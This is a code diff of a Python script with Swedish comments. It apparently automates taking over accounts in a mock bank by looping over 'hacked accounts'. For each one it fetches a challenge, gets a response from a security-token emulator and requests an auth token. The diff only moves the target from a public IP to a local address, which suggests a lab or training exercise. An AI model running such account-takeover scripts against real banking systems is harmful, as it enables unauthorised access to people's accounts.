@@ -7,7 +7,7 @@ def getToken():
     # -------------------------------------- HÄMTA TOKEN OCH SKAPA AUTHENTICATION HEADER --------------------------------------
 
     url = "/get_token?account=" + kontoNr + "&challenge_response=" + securityCode
-    conn = http.client.HTTPConnection("77.238.56.27", 5000)
+    conn = http.client.HTTPConnection("192.168.0.27", 5000)
     conn.request("GET", url)
 
     response = conn.getresponse()
@@ -24,7 +24,7 @@ print("****CPC_WARNING******:::___Starting_The_Hack_In..... 5... 4... 3.... 2...
 # -------------------------------------- HÄMTA CHALLENGE --------------------------------------
 
 
-conn = http.client.HTTPConnection("77.238.56.27:5000")
+conn = http.client.HTTPConnection("192.168.0.27:5000")
 
 conn.request("GET", "/get_challenge?account=1234567890")
 
@@ -41,7 +41,7 @@ conn.close()
 
 url = "/sakerhetsdosa/emulator.php?account=1234567890&challenge=" + challenge
 
-conn = http.client.HTTPConnection("77.238.56.27", 80)
+conn = http.client.HTTPConnection("192.168.0.27", 80)
 
 conn.request("GET", url)
 response = conn.getresponse()
@@ -54,7 +54,7 @@ conn.close()
 
 
 url = "/get_token?account=1234567890&challenge_response=" + securityCode
-conn = http.client.HTTPConnection("77.238.56.27", 5000)
+conn = http.client.HTTPConnection("192.168.0.27", 5000)
 conn.request("GET", url)
 
 response = conn.getresponse()
@@ -107,7 +107,7 @@ while (num < len(hackade_konton)):
 
     # -------------------------------------- HÄMTA CHALLENGE --------------------------------------
 
-    conn = http.client.HTTPConnection("77.238.56.27:5000")
+    conn = http.client.HTTPConnection("192.168.0.27:5000")
 
     conn.request("GET", "/get_challenge?account=" + kontoNr)
 
@@ -123,7 +123,7 @@ while (num < len(hackade_konton)):
 
     url = "/sakerhetsdosa/emulator.php?account=" + kontoNr + "&challenge=" + challenge
 
-    conn = http.client.HTTPConnection("77.238.56.27", 80)
+    conn = http.client.HTTPConnection("192.168.0.27", 80)
 
     conn.request("GET", url)
     response = conn.getresponse()
@@ -135,7 +135,7 @@ while (num < len(hackade_konton)):
     # -------------------------------------- HÄMTA TOKEN OCH SKAPA AUTHENTICATION HEADER --------------------------------------
 
     url = "/get_token?account=" + kontoNr + "&challenge_response=" + securityCode
-    conn = http.client.HTTPConnection("77.238.56.27", 5000)
+    conn = http.client.HTTPConnection("192.168.0.27", 5000)
     conn.request("GET", url)
 
     response = conn.getresponse()
